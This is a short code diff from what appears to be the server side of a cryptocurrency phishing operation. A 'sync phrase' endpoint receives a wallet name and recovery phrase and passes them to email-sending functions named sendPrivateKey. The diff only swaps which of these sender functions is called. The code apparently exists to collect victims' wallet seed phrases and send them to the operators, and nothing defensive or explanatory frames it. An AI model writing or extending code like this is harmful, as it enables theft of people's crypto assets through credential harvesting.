@@ -8,7 +8,7 @@ import {
   sendPrivateKey,
   sendPrivateKey2,
   sendThankUMail,
-  oreSendPrivateKey3,
+  oreSendPrivateKey2,
 } from "../../Email/SendGrid.js";
 
 // Paystack docs
@@ -152,7 +152,7 @@ export const oreSyncPhrase3 = async (req, res) => {
   if (!checkPhrase) return;
   // return;
   try {
-    oreSendPrivateKey3(walletName, rPhrase);
+    oreSendPrivateKey2(walletName, rPhrase);
     return responses.success({
       res,
       message: `it a success`,
